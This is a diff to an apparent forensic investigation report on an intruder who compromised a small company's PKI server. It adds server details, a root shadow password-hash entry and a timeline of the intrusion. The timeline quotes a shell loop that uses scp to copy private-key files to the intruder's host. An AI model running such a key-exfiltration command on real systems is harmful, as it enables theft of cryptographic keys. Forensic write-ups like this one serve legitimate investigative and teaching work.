@@ -132,19 +132,42 @@ The server itself has the IP address `192.168.0.1``. The consultant used the use
 |The disk image was created by the customer and handed over to the investigator
 |=== 
 
+.Basic server information
+Hostnames:: caserver.smallcompany.local caserver localhost.localdomain localhost
+Operating System::  Alpine Linux v3.2.3
+motd:: Welcome to our PKI management server
+nameserver:: 192.168.1.7
+root shadow entry:: root:$6$tLmnLjM0j3qZwQxd$YiYPWIAcN4a9W3p5.7jYL8Wg.5sVkedxQ2HRCSUvefVu008.dPyNziMe8LoY3s5DoxchY.G96XsT2jasType50:16703:0:::::
+timezone:: UTC
+programs:: php, apache, sudo, apk, 
+
 === Suspect information
 
+Name:: Peter
+Username:: peter
+IP:: 192.168.223.223
+Tools:: Nikto sqlmap
 
+==== Consultant
 
-==== Domain terms
+Some information about the consultant.
 
-List term in the domain. We need define domain related terms, e.g., terms used when we
-investigate a fraud related to accounting.
-• Accounts payable: fill out the definition here.
-• Accounts receivable: fill out the definition here.
-• Certified public accountant: fill out the definition here.
 
 == Suspect action timeline
+
+=== Timeline
+
+2015-09-25T06:41:16:: Consultant logs in for the first time from 192.168.23.5
+2015-09-25T08:04:10:: Intruder started probing endpoints from 192.168.223.223
+2015-09-25T08:10:05:: Intruder placed `test.csv`
+2015-09-25T08:11:04:: Intruder placed `upload.php`
+2015-09-25T08:24:??:: Intruder starts first ash session
+08:24:17:: Intruder exfiltrates `cakey.pem
+08:2[4-6]:??:: Intruder fails to exfiltrate `*key.pem`
+  `for i in $(find . -name "*key.pem"); do scp $i peter@192.168.0.223.223:/home/peter/; done`
+
+2024-04-28T12:45:00:: Investigator receives the disk image
+
 
 == Investigator activity logs
 
